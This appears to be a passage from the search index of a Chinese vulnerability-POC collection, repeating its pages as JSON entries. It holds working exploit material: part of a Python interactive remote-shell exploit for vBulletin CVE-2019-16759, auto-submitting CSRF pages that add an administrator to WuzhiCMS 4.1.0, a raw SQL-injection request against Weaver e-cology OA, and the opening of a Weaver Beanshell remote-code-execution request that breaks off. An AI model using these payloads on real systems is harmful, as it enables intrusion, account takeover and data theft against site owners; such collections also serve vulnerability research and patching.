: \"http://127.0.0.1:8080/\" } params = { \"routestring\" : \"ajax/render/widget_php\" } while True : try : cmd = raw_input ( \">>>Shell= \" ) params [ \"widgetConfig[code]\" ] = \"echo shell_exec('\" + cmd + \"');echo md5('vBulletin'); exit;\" r = requests . post ( url = sys . argv [ 1 ], data = params , proxies = proxies ) if r . status_code == 200 or r . status_code == 403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r . text : print print r . text . split ( 'be4ea51d962be8308a0099ae1eb3ec63' )[ 0 ] else : sys . exit ( \"Exploit failed! :(\" ) except KeyboardInterrupt : sys . exit ( \" \\n Closing shell...\" ) except Exception , e : sys . exit ( str ( e ))","title":"POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_9","text":"","title":""},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u4e94\u6307CMS 4.1.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-04-10 \u5957\u54e5\uff08 taoge@5ecurity.cn \uff09 https://github.com/wuzhicms/wuzhicms https://github.com/wuzhicms/wuzhicms 4.1.0 CVE-2018-9926 / CVE-2018-9927 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u4e94\u6307CMS 4.1.0\u7248\u672c\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u5c06\u666e\u901a\u7528\u6237\u63d0\u6210\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e94\u6307CMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u4e00\u5982\u4e0b\uff1a < html >< body > < script type = \"text/javascript\" > function post ( url , fields ) { var p = document . createElement ( \"form\" ); p . action = url ; p . innerHTML = fields ; p . target = \"_self\" ; p . method = \"post\" ; document . body . appendChild ( p ); p . submit (); } function csrf_hack () { var fields ; fields += \"<input type='hidden' name='form[role][]' value='1' />\" ; fields += \"<input type='hidden' name='form[username]' value='hack123' />\" ; fields += \"<input type='hidden' name='form[password]' value='' />\" ; fields += \"<input type='hidden' name='form[truename]' value='taoge@5ecurity' />\" ; var url = \"http://127.0.0.1/www/index.php?m=core&f=power&v=add&&_su=wuzhicms&_menuid=61&_submenuid=62&submit=\u63d0\u4ea4\" ; post ( url , fields ); } window . onload = function () { csrf_hack ();} </ script > </ body ></ html > CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u4e8c\u5982\u4e0b\uff1a < html >< body > < script type = \"text/javascript\" > function post ( url , fields ) { var p = document . createElement ( \"form\" ); p . action = url ; p . innerHTML = fields ; p . target = \"_self\" ; p . method = \"post\" ; document . body . appendChild ( p ); p . submit (); } function csrf_hack () { var fields ; fields += \"<input type='hidden' name='info[username]' value='hack123' />\" ; fields += \"<input type='hidden' name='info[password]' value='hacktest' />\" ; fields += \"<input type='hidden' name='info[pwdconfirm]' value='hacktest' />\" ; fields += \"<input type='hidden' name='info[email]' value='taoge@5ecurity.cn' />\" ; fields += \"<input type='hidden' name='info[mobile]' value='' />\" ; fields += \"<input type='hidden' name='modelids[]' value='10' />\" ; fields += \"<input type='hidden' name='info[groupid]' value='3' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='avatar' value='' />\" ; fields += \"<input type='hidden' name='islock' value='0' />\" ; fields += \"<input type='hidden' name='sys_name' value='0' />\" ; fields += \"<input type='hidden' name='info[birthday]' value='' />\" ; fields += \"<input type='hidden' name='info[truename]' value='' />\" ; fields += \"<input type='hidden' name='info[sex]' value='0' />\" ; fields += \"<input type='hidden' name='info[marriage]' value='0' />\" ; var url = \"http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=\u63d0\u4ea4\" ; post ( url , fields ); } window . onload = function () { csrf_hack ();} </ script > </ body ></ html >","title":"\u4e94\u6307CMS 4.1.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u4e94\u6307CMS 4.1.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-04-10 \u5957\u54e5\uff08 taoge@5ecurity.cn \uff09 https://github.com/wuzhicms/wuzhicms https://github.com/wuzhicms/wuzhicms 4.1.0 CVE-2018-9926 / CVE-2018-9927","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","text":"\u4e94\u6307CMS 4.1.0\u7248\u672c\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u5c06\u666e\u901a\u7528\u6237\u63d0\u6210\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e94\u6307CMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","text":"CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u4e00\u5982\u4e0b\uff1a < html >< body > < script type = \"text/javascript\" > function post ( url , fields ) { var p = document . createElement ( \"form\" ); p . action = url ; p . innerHTML = fields ; p . target = \"_self\" ; p . method = \"post\" ; document . body . appendChild ( p ); p . submit (); } function csrf_hack () { var fields ; fields += \"<input type='hidden' name='form[role][]' value='1' />\" ; fields += \"<input type='hidden' name='form[username]' value='hack123' />\" ; fields += \"<input type='hidden' name='form[password]' value='' />\" ; fields += \"<input type='hidden' name='form[truename]' value='taoge@5ecurity' />\" ; var url = \"http://127.0.0.1/www/index.php?m=core&f=power&v=add&&_su=wuzhicms&_menuid=61&_submenuid=62&submit=\u63d0\u4ea4\" ; post ( url , fields ); } window . onload = function () { csrf_hack ();} </ script > </ body ></ html > CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u4e8c\u5982\u4e0b\uff1a < html >< body > < script type = \"text/javascript\" > function post ( url , fields ) { var p = document . createElement ( \"form\" ); p . action = url ; p . innerHTML = fields ; p . target = \"_self\" ; p . method = \"post\" ; document . body . appendChild ( p ); p . submit (); } function csrf_hack () { var fields ; fields += \"<input type='hidden' name='info[username]' value='hack123' />\" ; fields += \"<input type='hidden' name='info[password]' value='hacktest' />\" ; fields += \"<input type='hidden' name='info[pwdconfirm]' value='hacktest' />\" ; fields += \"<input type='hidden' name='info[email]' value='taoge@5ecurity.cn' />\" ; fields += \"<input type='hidden' name='info[mobile]' value='' />\" ; fields += \"<input type='hidden' name='modelids[]' value='10' />\" ; fields += \"<input type='hidden' name='info[groupid]' value='3' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='pids[]' value='0' />\" ; fields += \"<input type='hidden' name='avatar' value='' />\" ; fields += \"<input type='hidden' name='islock' value='0' />\" ; fields += \"<input type='hidden' name='sys_name' value='0' />\" ; fields += \"<input type='hidden' name='info[birthday]' value='' />\" ; fields += \"<input type='hidden' name='info[truename]' value='' />\" ; fields += \"<input type='hidden' name='info[sex]' value='0' />\" ; fields += \"<input type='hidden' name='info[marriage]' value='0' />\" ; var url = \"http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=\u63d0\u4ea4\" ; post ( url , fields ); } window . onload = function () { csrf_hack ();} </ script > </ body ></ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u7b80\u4ecb \u00b6 \u6cdb\u5fae\u63d0\u4f9b\u4e86\u79fb\u52a8\u529e\u516c\u3001\u5fae\u4fe1\u529e\u516c\u3001\u534f\u540c\u529e\u516c(OA)\u3001\u6d41\u7a0b\u7ba1\u7406\u3001\u4fe1\u606f\u95e8\u6237\u3001\u77e5\u8bc6\u7ba1\u7406\u3001\u8d39\u63a7\u7ba1\u7406\u7b49\u529f\u80fd\uff0c\u9002\u7528\u4e8e\u624b\u673a\u548cpc\u7aef\uff0c\u662f\u5f53\u4eca\u6bd4\u8f83\u4e3b\u6d41\u7684OA\u7cfb\u7edf\u4e4b\u4e00\u3002 \u539f\u7406\u6982\u8ff0 \u00b6 \u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u6536\u5230\u7528\u6237\u8f93\u5165\u7684\u65f6\u5019\u672a\u8fdb\u884c\u5b89\u5168\u8fc7\u6ee4\uff0c oracle\u6570\u636e\u5e93\u4f20\u5165\u6076\u610fSQL\u8bed\u53e5\uff0c\u5bfc\u81f4SQL\u6f0f\u6d1e \u5f71\u54cd\u8303\u56f4 \u00b6 \u4f7f\u7528oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae e-cology OA \u7cfb\u7edf \u6f0f\u6d1e\u5229\u7528 \u00b6 \u627e\u5230oracle\u6570\u636e\u5e93\u7684\u6cdb\u5faeOA\u7cfb\u7edf\u540e\u76f4\u63a5\u4f7f\u7528Poc\uff08\u5df2\u516c\u5f00\uff09 \u5982\u679c\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5219\u663e\u793a\u7ed3\u679c\u5982\u4e0b\uff1a \u5982\u679c\u6f0f\u6d1e\u5b58\u5728\uff0c\u5219\u4f1a\u76f4\u63a5\u56de\u663e\u5f88\u591a\u6570\u636e: Poc\u5982\u4e0b\uff1a\uff08\u52ff\u7528\u4e8e\u975e\u6cd5\u9014\u5f84\uff09 \u00b6 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 \u4fee\u6539NULL\u540e\u4e3a\u8981\u67e5\u8be2\u7684\u5b57\u6bb5\u540d,\u4fee\u6539from\u540e\u4e3a\u67e5\u8be2\u7684\u8868 \u7b80\u6d01\u7248POC POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1 & scope=2333 HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1","title":"\u6cdb\u5fae e cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#e-cology-oa-sql","text":"","title":"\u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"\u6cdb\u5fae\u63d0\u4f9b\u4e86\u79fb\u52a8\u529e\u516c\u3001\u5fae\u4fe1\u529e\u516c\u3001\u534f\u540c\u529e\u516c(OA)\u3001\u6d41\u7a0b\u7ba1\u7406\u3001\u4fe1\u606f\u95e8\u6237\u3001\u77e5\u8bc6\u7ba1\u7406\u3001\u8d39\u63a7\u7ba1\u7406\u7b49\u529f\u80fd\uff0c\u9002\u7528\u4e8e\u624b\u673a\u548cpc\u7aef\uff0c\u662f\u5f53\u4eca\u6bd4\u8f83\u4e3b\u6d41\u7684OA\u7cfb\u7edf\u4e4b\u4e00\u3002","title":"\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u6536\u5230\u7528\u6237\u8f93\u5165\u7684\u65f6\u5019\u672a\u8fdb\u884c\u5b89\u5168\u8fc7\u6ee4\uff0c oracle\u6570\u636e\u5e93\u4f20\u5165\u6076\u610fSQL\u8bed\u53e5\uff0c\u5bfc\u81f4SQL\u6f0f\u6d1e","title":"\u539f\u7406\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u4f7f\u7528oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae e-cology OA \u7cfb\u7edf","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_4","text":"\u627e\u5230oracle\u6570\u636e\u5e93\u7684\u6cdb\u5faeOA\u7cfb\u7edf\u540e\u76f4\u63a5\u4f7f\u7528Poc\uff08\u5df2\u516c\u5f00\uff09 \u5982\u679c\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5219\u663e\u793a\u7ed3\u679c\u5982\u4e0b\uff1a \u5982\u679c\u6f0f\u6d1e\u5b58\u5728\uff0c\u5219\u4f1a\u76f4\u63a5\u56de\u663e\u5f88\u591a\u6570\u636e:","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 \u4fee\u6539NULL\u540e\u4e3a\u8981\u67e5\u8be2\u7684\u5b57\u6bb5\u540d,\u4fee\u6539from\u540e\u4e3a\u67e5\u8be2\u7684\u8868 \u7b80\u6d01\u7248POC POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1 & scope=2333 HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1","title":"Poc\u5982\u4e0b\uff1a\uff08\u52ff\u7528\u4e8e\u975e\u6cd5\u9014\u5f84\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u8be6\u60c5 \u00b6 \u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd \u5229\u7528\u65b9\u5f0f \u00b6 ``` POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded 